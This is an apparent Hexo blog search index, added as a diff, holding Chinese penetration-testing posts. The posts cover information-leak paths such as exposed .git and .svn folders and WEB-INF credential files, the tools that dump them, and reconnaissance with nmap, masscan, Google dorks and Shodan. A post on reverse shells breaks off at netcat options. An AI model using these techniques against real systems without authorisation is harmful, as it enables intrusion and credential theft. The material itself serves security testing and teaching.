@@ -1,0 +1,347 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>信息泄露总结</title>
+    <url>/2019/06/15/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>在渗透测试过程中，由于网站配置不当，或者代码逻辑错误，往往会泄露一些敏感信息，本文对此做一个总结，欢迎各位补充。</p>
+<h1 id="01、Apache样例文件泄露"><a href="#01、Apache样例文件泄露" class="headerlink" title="01、Apache样例文件泄露"></a>01、Apache样例文件泄露</h1><p>apache 的一些样例文件没有删除，可能存在可能存在cookie、session伪造，进行后台登录操作。常见的路径有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;CookieExample</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;RequestHeaderExample</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;jsp&#x2F;snp&#x2F;snoop.jsp</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;examples&#x2F;async&#x2F;async1</span><br></pre></td></tr></table></figure>
+
+<h1 id="02、IIS短文件名"><a href="#02、IIS短文件名" class="headerlink" title="02、IIS短文件名"></a>02、IIS短文件名</h1><p>工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a></p>
+<p>利用：</p>
+<p><img src="10-1560595853.jpg" alt="信息泄露总结"></p>
+<h1 id="03、字段加-造成信息泄露"><a href="#03、字段加-造成信息泄露" class="headerlink" title="03、字段加[] 造成信息泄露"></a>03、字段加[] 造成信息泄露</h1><p>网站所有参数均存在，把参数变为数组即可报错出网站绝对路径。</p>
+<p>比如：<img src="7-1560595854.jpg" alt="信息泄露总结"></p>
+<h1 id="04、修改请求方法"><a href="#04、修改请求方法" class="headerlink" title="04、修改请求方法"></a>04、修改请求方法</h1><p>将get方法改为put 程序就报错，泄漏网站绝对路径。<br>比如：</p>
+<p><img src="4-1560595854.jpg" alt="信息泄露总结"></p>
+<p>当然，也可修改位其他方法，多fuzz。</p>
+<h1 id="05、war文件信息泄露"><a href="#05、war文件信息泄露" class="headerlink" title="05、war文件信息泄露"></a>05、war文件信息泄露</h1><p>war文件信息泄露是指部署在war文件由于配置不当，导致其整个报文件以及其他重要的配置文件信息泄露，例如可以直接浏览目录，获取其下面的配置文件：WEB-INF/jdbc.properties,jdbc.properties为数据库链接配置文件。包含数据库链接的账户和密码等重要信息。<br>比如：</p>
+<p><img src="1-1560595854.jpg" alt="信息泄露总结"></p>
+<p>java 一般重要的配置文件位于 WEB-INF 目录下，其常见的重要的配置文件有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config&#x2F;config.properties</span><br><span class="line">configure&#x2F;configure.properties</span><br><span class="line">applicationContext.xml</span><br><span class="line">sysconfig.properties</span><br><span class="line">web.xml</span><br><span class="line">config.xml</span><br><span class="line">jdbc.properties</span><br></pre></td></tr></table></figure>
+
+<h1 id="06、swagger"><a href="#06、swagger" class="headerlink" title="06、swagger"></a>06、swagger</h1><p>常见路径：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;v1.x&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;index.html</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://datax.yahoo.com/%20/。然后我看到了以下页面。" target="_blank" rel="noopener">https://datax.yahoo.com/%20/。然后我看到了以下页面。</a></p>
+<p><img src="5-1560595854.jpg" alt="信息泄露总结"></p>
+<h1 id="07、Tomcat"><a href="#07、Tomcat" class="headerlink" title="07、Tomcat"></a>07、Tomcat</h1><p>tomcat 后缀改成大写，会显示源码，只要把jsp文件后缀名改为大写就可以</p>
+<p>比如：</p>
+<p><img src="4-1560595855.jpg" alt="信息泄露总结"></p>
+<h1 id="08、阿里云oosaccesskey泄露"><a href="#08、阿里云oosaccesskey泄露" class="headerlink" title="08、阿里云oosaccesskey泄露"></a>08、阿里云oosaccesskey泄露</h1><p>上传文件处，在返回包中直接显示了阿里oss静态服务器的OSSAccessKeyId的值，导致信息泄漏 。</p>
+<p><img src="5-1560595855.jpg" alt="信息泄露总结"></p>
+<h1 id="09、j2ee应用异常信息"><a href="#09、j2ee应用异常信息" class="headerlink" title="09、j2ee应用异常信息"></a>09、j2ee应用异常信息</h1><p>Java异常处理机制（Exception）简要说明：Java中它是由Trowable类的两个子类的两大部分组成，Error类和Exception类。Error是不推荐捕获的（请查看Java异常处理机制中Error与Exception的区别），而Exception类除了子类RuntimeException是不能被捕获，其他子类的异常必须捕获，简单来讲，就产生异常信息了。</p>
+<p>但Exception产生异常信息的过程有个特点，当发生异常时，<strong>异常抛给调用该函数的上一级函数</strong>，直到出现包含异常处理（catch）的层为止，这个给开发者在程序调试中带来很大的方便，能够快速定位问题所在等</p>
+<p>形成XSS的场景：与上面场景不同的地方有两个：</p>
+<p>1、如果开发者自己处理了异常信息但还是向用户抛出（在实际开发中这情况还不少，还做个用户体验页面，让用户把这些异常信息反馈给管理员（当然，开发者本意是好的！）。）</p>
+<p>2、带有用户输入而又未做XSS防御处理的数据（攻击者的恶意代码）。</p>
+<p><img src="4-1560595855-1.jpg" alt="信息泄露总结"></p>
+<p><img src="1-1560595855.jpg" alt="信息泄露总结"></p>
+<p>当然，如果最后默认是交给容器处理输出，是不会有这问题，如图：</p>
+<p><img src="1-1560595856.jpg" alt="信息泄露总结"></p>
+<h1 id="10、源代码泄露"><a href="#10、源代码泄露" class="headerlink" title="10、源代码泄露"></a>10、源代码泄露</h1><h2 id="1-Mercurial-hg-源码泄露"><a href="#1-Mercurial-hg-源码泄露" class="headerlink" title="(1).Mercurial .hg 源码泄露"></a>(1).Mercurial .hg 源码泄露</h2><p>hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件</p>
+<p>eg: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip-hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-git-源码泄露"><a href="#2-git-源码泄露" class="headerlink" title="(2).git 源码泄露"></a>(2).git 源码泄露</h2><p>在运行 git init 的时候，在当前目录下会产生一个.git 文件。</p>
+<p>eg:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>工具：Githack</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-DS-Store-文件泄露"><a href="#3-DS-Store-文件泄露" class="headerlink" title="(3).DS_Store 文件泄露"></a>(3).DS_Store 文件泄露</h2><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
+<p>eg: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;ds_store_exp</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-svn-源代码泄露"><a href="#4-svn-源代码泄露" class="headerlink" title="(4).svn 源代码泄露"></a>(4).svn 源代码泄露</h2><p>使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。eg: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;entries</span><br></pre></td></tr></table></figure>
+
+<p>工具：seay-Svn</p>
+<h2 id="5-cvs文件泄露"><a href="#5-cvs文件泄露" class="headerlink" title="(5).cvs文件泄露"></a>(5).cvs文件泄露</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Root 返回根信息</span><br><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;CSV&#x2F;Entries 返回所有文件结构</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-bazaarbazaar信息泄露"><a href="#6-bazaarbazaar信息泄露" class="headerlink" title="(6).bazaarbazaar信息泄露"></a>(6).bazaarbazaar信息泄露</h2><p>bazaarbazaar是一个版本控制系统，可以追踪项目历史</p>
+<p>eg:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kost&#x2F;dvcs-ripper</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-WEB-INF-web-xml-泄露"><a href="#7-WEB-INF-web-xml-泄露" class="headerlink" title="(7).WEB-INF/web.xml 泄露"></a>(7).WEB-INF/web.xml 泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties</span><br></pre></td></tr></table></figure>
+
+<h1 id="11、总结"><a href="#11、总结" class="headerlink" title="11、总结"></a>11、总结</h1><p>以上是笔者学习中遇到的，欢迎各位大佬继续补充。</p>
+]]></content>
+      <categories>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/07/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试之信息收集</title>
+    <url>/2019/06/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h1 id="一、DNS"><a href="#一、DNS" class="headerlink" title="一、DNS"></a>一、DNS</h1><h2 id="1、A记录"><a href="#1、A记录" class="headerlink" title="1、A记录"></a>1、A记录</h2><ul>
+<li>ping nslookup</li>
+<li>dig 域名</li>
+<li>dig -t a baidu.com</li>
+</ul>
+<h2 id="2、NS记录（DNS服务器）"><a href="#2、NS记录（DNS服务器）" class="headerlink" title="2、NS记录（DNS服务器）"></a>2、NS记录（DNS服务器）</h2><ul>
+<li>dig -t NS 域名</li>
+</ul>
+<h2 id="3、MX记录（邮件服务器）"><a href="#3、MX记录（邮件服务器）" class="headerlink" title="3、MX记录（邮件服务器）"></a>3、MX记录（邮件服务器）</h2><ul>
+<li>dig -t MX baidu.com</li>
+</ul>
+<h2 id="4、CNAME记录（别名）"><a href="#4、CNAME记录（别名）" class="headerlink" title="4、CNAME记录（别名）"></a>4、CNAME记录（别名）</h2><ul>
+<li>dig -t CNAME baidu.com</li>
+</ul>
+<h2 id="5、whois查询（域名信息查询）"><a href="#5、whois查询（域名信息查询）" class="headerlink" title="5、whois查询（域名信息查询）"></a>5、whois查询（域名信息查询）</h2><p><a href="http://whois.chinaz.com" target="_blank" rel="noopener">whois.chinaz.com</a><br><a href="http://whois.iana.org" target="_blank" rel="noopener">whois.iana.org</a><br><a href="http://www.arin.net" target="_blank" rel="noopener">www.arin.net</a><br><a href="http://who.is" target="_blank" rel="noopener">who.is</a><br><a href="http://centralops.net/co/" target="_blank" rel="noopener">centralops.net</a><br><a href="http://www.17ce.com" target="_blank" rel="noopener">www.17ce.com</a></p>
+<h1 id="二、子域名"><a href="#二、子域名" class="headerlink" title="二、子域名"></a>二、子域名</h1><h2 id="1、爆破"><a href="#1、爆破" class="headerlink" title="1、爆破"></a>1、爆破</h2><ul>
+<li>dnsmap baidu.com -w 字典dnsmap默认字典 /usr/share/dnsmap/wordlist_TLAs.txt</li>
+<li>fuzzDomain 工具</li>
+<li>Layer子域名挖掘机</li>
+</ul>
+<h2 id="2、搜索引擎"><a href="#2、搜索引擎" class="headerlink" title="2、搜索引擎"></a>2、搜索引擎</h2><ul>
+<li>google hacker 语法<br><code>site:baidu.com</code></li>
+</ul>
+<h2 id="3、kali下："><a href="#3、kali下：" class="headerlink" title="3、kali下："></a>3、kali下：</h2><ul>
+<li>theharvester<br>proxychains theharvester -d baidu.com -b all<br>proxychains 加代理</li>
+<li>AQUATONE工具<br>发现 proxychains aquatone-discover -d 域名 -t 10（线程）<br>扫描 proxychains aquatone-scan-d 域名 -t 10（线程）<br>收集 proxychains aquatone-gather -d 域名 -t 10（线程）</li>
+</ul>
+<h2 id="4、域传送"><a href="#4、域传送" class="headerlink" title="4、域传送"></a>4、域传送</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fierce -dns  baidu.com   （域名有DNS服务器才能用）</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、在线网站"><a href="#5、在线网站" class="headerlink" title="5、在线网站"></a>5、在线网站</h2><p><a href="http://www.virustotal.com" target="_blank" rel="noopener">www.virustotal.com</a><br><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster.com</a><br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">phpinfo.me</a></p>
+<h1 id="三、C段"><a href="#三、C段" class="headerlink" title="三、C段"></a>三、C段</h1><h2 id="1、Namp扫描"><a href="#1、Namp扫描" class="headerlink" title="1、Namp扫描"></a>1、Namp扫描</h2><p>Nmap-扫描C段主机存活</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sn -PE -n 192.168.1.1&#x2F;24 -oX out.xml</span><br><span class="line">    -sn不扫描端口</span><br><span class="line">    -PE ICMP扫描</span><br><span class="line">    -n不进行dns解析</span><br></pre></td></tr></table></figure>
+
+<p>Nmap-定向端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -Pn -p 3389 ip</span><br><span class="line">    扫描方式：半开放扫描</span><br><span class="line">    -Pn 不进行主机存活探测</span><br></pre></td></tr></table></figure>
+
+<p>Nmap-全端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -Pn -p 1-65535 -n ip</span><br><span class="line">    扫描方式：半开放扫描</span><br></pre></td></tr></table></figure>
+
+<p>Nmap-服务扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -sS -sV -p 1-65535 -n ip</span><br><span class="line">    扫描方式：半开放扫描</span><br><span class="line">    显示出端口开发的服务</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、Masscan"><a href="#2、Masscan" class="headerlink" title="2、Masscan"></a>2、Masscan</h2><p>Masscan-安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git gcc make libpcap-dev（安装必备环境，kali已经默认安装完成）</span><br><span class="line">git clone</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br><span class="line">cd masscan</span><br><span class="line">make（编译）</span><br></pre></td></tr></table></figure>
+
+<p>Masscan-使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan -p 80  192.168.1.1&#x2F;24  --rate 1000  -oL  output.txt</span><br><span class="line">    -p设置端口</span><br><span class="line">    --rate发包速率</span><br><span class="line">    -oL输出位置</span><br><span class="line">为了绕过扫描特定ip，可以添加-excludefile </span><br><span class="line">Masscan-p 80 ip --excludefile special.txt</span><br><span class="line">    自定多种格式输出</span><br><span class="line">    -oX输出xml</span><br><span class="line">    -oJ输出json格式</span><br><span class="line">    -oL输出简单列表</span><br></pre></td></tr></table></figure>
+
+<p>Masscan-注意问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描选项中必须添加端口-p、--ports 1-65535</span><br><span class="line">目标主机是IP地址，不是域名</span><br></pre></td></tr></table></figure>
+
+<p>Masscan-总结</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan&#x3D;&#x3D;namp-sS-Pn-n-randomize-hosts-send-eth</span><br><span class="line">速率：可以执行最高300、000个数据包每秒</span><br><span class="line">注册账号能找到服务器地址</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、web目录扫描"><a href="#四、web目录扫描" class="headerlink" title="四、web目录扫描"></a>四、web目录扫描</h1><h2 id="1、robots-txt文件"><a href="#1、robots-txt文件" class="headerlink" title="1、robots.txt文件"></a>1、robots.txt文件</h2><p><a href="https://baidu.com/robots.txt" target="_blank" rel="noopener">https://baidu.com/robots.txt</a></p>
+<h2 id="2、搜索引擎-1"><a href="#2、搜索引擎-1" class="headerlink" title="2、搜索引擎"></a>2、搜索引擎</h2><p>site: baidu.com</p>
+<h2 id="3、爆破"><a href="#3、爆破" class="headerlink" title="3、爆破"></a>3、爆破</h2><ul>
+<li><p>dirb (kali下)</p>
+</li>
+<li><p>ddirb <a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a></p>
+<p>爆破一DIRB</p>
+<p>参数：</p>
+<ul>
+<li>设置User-Agent</li>
+<li>-b不扫描./或者./</li>
+<li>-c设置Cookie</li>
+<li>-E设置证书文件</li>
+<li>-o outfile_file保存扫描文件</li>
+</ul>
+</li>
+<li><p>dirbuster（kali下） （不推荐，已经停止更新）</p>
+</li>
+</ul>
+<h2 id="4、御剑后台扫描（自行下载）"><a href="#4、御剑后台扫描（自行下载）" class="headerlink" title="4、御剑后台扫描（自行下载）"></a>4、御剑后台扫描（自行下载）</h2><h1 id="五、-指纹"><a href="#五、-指纹" class="headerlink" title="五、 指纹"></a>五、 指纹</h1><h2 id="1、指纹识别"><a href="#1、指纹识别" class="headerlink" title="1、指纹识别"></a>1、指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn -O ip</span><br><span class="line">nmap -sS -sV ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、中间件指纹识别"><a href="#2、中间件指纹识别" class="headerlink" title="2、中间件指纹识别"></a>2、中间件指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一： 通过http返回消息中提取server字段</span><br><span class="line">方法二： nmap -sS -Pn -sV ip </span><br><span class="line">方法三： 构造错误界面返回信息查看中间件</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、web程序指纹识别"><a href="#3、web程序指纹识别" class="headerlink" title="3、web程序指纹识别"></a>3、web程序指纹识别</h2><ul>
+<li>开发语言</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL 后缀名识别  .asp  .php   .jsp</span><br><span class="line">抓包，查看与后台交互点</span><br><span class="line">http返回消息头  x-Powered-By</span><br><span class="line">cookie可以识别， PHPSESSION --&gt;PHP  JSPSESSION --&gt; JSP  ASPSESSIONIDAASTCACQ --&gt;ASP</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开发框架</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的thinkphp框架识别方法特定ico图标</span><br><span class="line">Action后缀 90%几率struts2或者webwork</span><br><span class="line">do后缀 50%几率spring mvc</span><br><span class="line">url路径&#x2F;action&#x2F;xxx70%几率struts2</span><br><span class="line">form后缀 60%几率spring mvc</span><br><span class="line">Vm后缀 90%几率VelocityViewServlet</span><br><span class="line">jsf后缀 99%几率Java Server Faces</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第三方组件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般包括流量统计、文件编辑器、模板引擎</span><br><span class="line">识别方法：一般目录扫描</span><br><span class="line">FCKeditor   </span><br><span class="line">CKEditor</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CMS程序</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特定文件夹</span><br><span class="line">dede&#x2F;、admin&#x2F;admin_Login.aspx</span><br><span class="line">Powered by***</span><br><span class="line">网站favicon图标</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>数据库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常规判断，asp-&gt;sql server，php-&gt;mysql，jsp-oracle</span><br><span class="line">网站错误信息</span><br><span class="line">端口服务，1443-&gt;sql server，3306-&gt;mysql，oracal-&gt;1521</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在线探测</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wappalyzer插件</span><br><span class="line">云悉： http:&#x2F;&#x2F;www.yunsee.cn</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、防火墙指纹识别"><a href="#4、防火墙指纹识别" class="headerlink" title="4、防火墙指纹识别"></a>4、防火墙指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80   域名  --script http-waf-fingerprint</span><br><span class="line">sqlmap  -u   360.cn  --identify-waf</span><br><span class="line">wafw00f工具    https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00f</span><br><span class="line">python setup.py install   或者  pip install wafw00f</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、GoogleHacking"><a href="#六、GoogleHacking" class="headerlink" title="六、GoogleHacking"></a>六、GoogleHacking</h1><h2 id="1、语法"><a href="#1、语法" class="headerlink" title="1、语法"></a>1、语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ 强制搜索其后的一个单词</span><br><span class="line">- 把某个字忽略</span><br><span class="line">~ 同意词</span><br><span class="line">. 单一的通配符</span><br><span class="line">* 通配符，可代表多个字母</span><br><span class="line">&quot; &quot; 精确查询</span><br><span class="line">&quot;|&quot;或&quot;OR&quot; 只要符合多个关键字中的任意一个的结果予以显示</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、基本用法"><a href="#2、基本用法" class="headerlink" title="2、基本用法"></a>2、基本用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intext:key 搜索网页带有关键字的页面</span><br><span class="line">allintext:key 功能与intext，但是可以接多个关键字</span><br><span class="line">intitle:key 搜索网页标题中是否有所输入的文字</span><br><span class="line">allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用</span><br><span class="line">cache:url 查看指定URL快照</span><br><span class="line">filetype： 搜索指定类型文件</span><br><span class="line">info: 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用</span><br><span class="line">inurl: 搜索输入字符是否存在于URL中，可以与site结合找后台</span><br><span class="line">site： 搜索特定网站或者子域名</span><br><span class="line">related:URL 搜索与该URL相关的页面</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、高级用法"><a href="#3、高级用法" class="headerlink" title="3、高级用法"></a>3、高级用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site： 特定网站搜索，可以寻找子域名、域名、端口</span><br><span class="line">site: URL filetype:doc  搜索与该域名相关的doc文件</span><br><span class="line">site: URL filetype:doc 搜索与该域名相关的doc文件</span><br><span class="line">site: URL intitle： 登录搜索与该域名相关联关键词的网页</span><br><span class="line">site: URL inurl:&#x2F;login  搜索与该域名相关URL的网页</span><br><span class="line">site：36.110.213.* C段快速探测</span><br></pre></td></tr></table></figure>
+
+<p>Google hacking语法收集网站 <a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/us</a></p>
+<h1 id="七、网络空间搜索引擎"><a href="#七、网络空间搜索引擎" class="headerlink" title="七、网络空间搜索引擎"></a>七、网络空间搜索引擎</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan：www.shodan.io</span><br></pre></td></tr></table></figure>
+
+<h2 id="1、基本语法"><a href="#1、基本语法" class="headerlink" title="1、基本语法"></a>1、基本语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hostname:&quot;360.cn&quot; 主机名</span><br><span class="line">port：23 搜索端口</span><br><span class="line">net：192.168.1.0&#x2F;24 CIDR格式的IP地址</span><br><span class="line">city:&quot;San Diego&quot; 城市</span><br><span class="line">product:&quot;Apache httpd” </span><br><span class="line">version:&quot;2.6.1” 软件版本</span><br><span class="line">os:“Windows7&quot; 操作系统</span><br><span class="line">country:&quot;CN” 国家简写</span><br><span class="line">org:&quot;google” 组织</span><br><span class="line">isp:&quot;China Telecom&quot; ISP服务商</span><br><span class="line">geo:&quot;38.4681，106.2731”</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、基本使用"><a href="#2、基本使用" class="headerlink" title="2、基本使用"></a>2、基本使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索开放80端口的主机 port：80</span><br><span class="line">搜索开放80端口的主机，并且服务器是nginx port：80 product:&quot;nginx”</span><br><span class="line">C段探测  net:ip&#x2F;24</span><br><span class="line">搜索favicon:http.favicon.hash:-395680774 这里搜索的是标题栏的图标</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、其他"><a href="#3、其他" class="headerlink" title="3、其他"></a>3、其他</h2><p><a href="http://www.zoomeye.org" target="_blank" rel="noopener">钟馗之眼 http://www.zoomeye.org</a><br><a href="http://fofa.so" target="_blank" rel="noopener">fafo http://www.zoomeye.org</a></p>
+]]></content>
+      <categories>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各种环境下反弹shell</title>
+    <url>/2019/06/21/%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h1 id="0x00-NC命令详解"><a href="#0x00-NC命令详解" class="headerlink" title="0x00 NC命令详解"></a>0x00 NC命令详解</h1><p>在介绍如何反弹shell之前，先了解相关知识要点。</p>
+<p>nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流</p>
+<p>可运行在TCP或者UDP模式，添加参数 —u 则调整为udP，默认为tcp，详细参数如下</p>
+<ul>
+<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
+<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
+<li>-h 在线帮助。</li>
+<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
